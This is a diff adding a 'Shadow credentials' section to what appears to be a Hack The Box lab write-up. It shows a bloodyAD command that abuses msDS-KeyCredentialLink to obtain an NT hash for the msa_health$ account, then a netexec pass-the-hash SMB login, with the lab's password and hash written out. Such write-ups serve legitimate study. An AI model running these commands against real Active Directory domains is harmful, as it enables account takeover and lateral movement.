@@ -288,4 +288,20 @@ msDS-KeyCredentialLink: WRITE
 
 ## Shadow credentials
 ```python
+faketime -f +7h bloodyAD --host dc01.logging.htb -d logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k add shadowCredentials 'msa_health$'
+[+] KeyCredential generated with following sha256 of RSA key: ec53b04dbfd8e509b7daa3303355d54125123aaa5ccc4d4ec0b6421d3af52a41
+[+] TGT stored in ccache file msa_health_jh.ccache
+
+NT: 603fc24ee01a9409f83c9d1d701485c5
 ```
+
+I now have an NT hash for this user
+
+```python
+❯❯❯ nxc smb dc01.logging.htb -u msa_health$ -H '603fc24ee01a9409f83c9d1d701485c5'        
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5
+```
+
+This user is now compromised
+
